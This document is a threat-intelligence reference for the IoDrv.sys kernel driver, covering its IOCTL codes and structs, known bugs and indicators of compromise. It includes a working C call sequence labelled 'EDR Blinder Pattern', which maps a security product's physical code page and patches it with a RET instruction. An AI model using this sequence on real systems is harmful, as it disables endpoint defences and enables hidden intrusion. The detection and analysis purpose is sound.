# IoDrv.sys — IOCTL Interface Reference

## Device & Buffering Model

| Property | Value |
|---|---|
| Device name | `\Device\IoDrv` |
| Symbolic link | `\DosDevices\IoDrv` (user-mode: `\\.\IoDrv`) |
| Device type | `0x8010` |
| Buffering | `METHOD_BUFFERED` — Windows copies caller buffer in/out via `SystemBuffer` |
| Access | `FILE_ANY_ACCESS` — no privilege check |

---

## IOCTL Summary

| IOCTL | Code | Direction | Buffer Size |
|---|---|---|---|
| `MAPPHYSTOLIN` | `0x80102040` | In + Out | 32 bytes |
| `UNMAPPHYSADDR` | `0x80102044` | In only | 32 bytes |
| `READPORT` | `0x80102050` | In + Out | 7 bytes |
| `WRITEPORT` | `0x80102054` | In only | 7 bytes |

---

## Structs

### `0x80102040` — MAPPHYSTOLIN
Maps a physical address range into the caller's user-mode address space.

```c
struct IODRV_MAP_REQUEST {
    UINT64 Size;           // +0x00  IN:  bytes to map
    UINT64 PhysAddress;    // +0x08  IN:  target physical address
    UINT64 SectionHandle;  // +0x10  OUT: section handle (keep for UNMAP)
    UINT64 VirtualAddress; // +0x18  OUT: user-mode R/W pointer into physical RAM
};
// IoStatus.Information = 32
```

### `0x80102044` — UNMAPPHYSADDR
Tears down a mapping created by MAPPHYSTOLIN.

```c
struct IODRV_UNMAP_REQUEST {
    UINT64 _reserved0;     // +0x00  unused
    UINT64 _reserved1;     // +0x08  unused
    UINT64 SectionHandle;  // +0x10  IN: handle from MAP → ZwClose
    UINT64 VirtualAddress; // +0x18  IN: address from MAP → ZwUnmapViewOfSection
};
```

### `0x80102050` — READPORT
Reads a value from an x86 hardware I/O port.

```c
struct IODRV_PORT_IO {
    UINT16 Port;   // +0x00  IN:  I/O port address (0x0000–0xFFFF)
    UINT32 Value;  // +0x02  OUT: result of IN instruction
    UINT8  Width;  // +0x06  IN:  1=byte, 2=word, 4=dword
};
// IoStatus.Information = 4
```

### `0x80102054` — WRITEPORT
Writes a value to an x86 hardware I/O port.

```c
struct IODRV_PORT_IO {
    UINT16 Port;   // +0x00  IN: I/O port address
    UINT32 Value;  // +0x02  IN: value to write
    UINT8  Width;  // +0x06  IN: 1=byte, 2=word, 4=dword
};
```

---

## Attack Call Sequence (EDR Blinder Pattern)

```c
// 1. Open device — no special privileges beyond admin + driver loaded
HANDLE hDev = CreateFileW(L"\\\\.\\IoDrv",
                           GENERIC_READ | GENERIC_WRITE,
                           0, NULL, OPEN_EXISTING, 0, NULL);

// 2. Map target physical page (e.g. EDR driver's code page)
IODRV_MAP_REQUEST req = { .Size = 0x1000, .PhysAddress = target_phys };
DeviceIoControl(hDev, 0x80102040,
                &req, sizeof(req),
                &req, sizeof(req), &returned, NULL);

// 3. Patch — write RET gadget at function prologue
*(BYTE *)req.VirtualAddress = 0xC3;

// 4. Clean up
IODRV_UNMAP_REQUEST unmap = {
    .SectionHandle  = req.SectionHandle,
    .VirtualAddress = req.VirtualAddress
};
DeviceIoControl(hDev, 0x80102044,
                &unmap, sizeof(unmap),
                NULL, 0, &returned, NULL);
```

---

## Known Bugs

| Location | Issue |
|---|---|
| All IOCTLs | `Options` (OutputBufferLength) is fully attacker-controlled and passed as `memmove` length into fixed stack buffers — potential kernel stack overflow |
| UNMAPPHYSADDR | `Object` pointer used in `ObfDereferenceObject` is uninitialized on the UNMAP path — dangling reference bug |

---

## IOCs

| IOC | Type | Notes |
|---|---|---|
| `844304be902d933f0b335b35bebbe620b6c8d613` | SHA1 | IoDrv.sys / Redacted.sys |
| `4ccd3c4371efcd373b52c866057108f37b9bf634` | SHA1 | Redacted EDR Blinder (wrapper exe) |
| `\Device\IoDrv` | Kernel object | Device name at runtime |
| `\DosDevices\IoDrv` | Kernel object | Symbolic link |
| `TOPSTAR OVERSEAS ELECTRONICS Co.,Ltd` | Cert signer | Code-signing certificate subject |
| `0x80102040 / 44 / 50 / 54` | IOCTL codes | Detectable via ETW / kernel callbacks |

---

*Based on static analysis of IoDrv.sys and Beazley Security incident report (Sept 2026).*
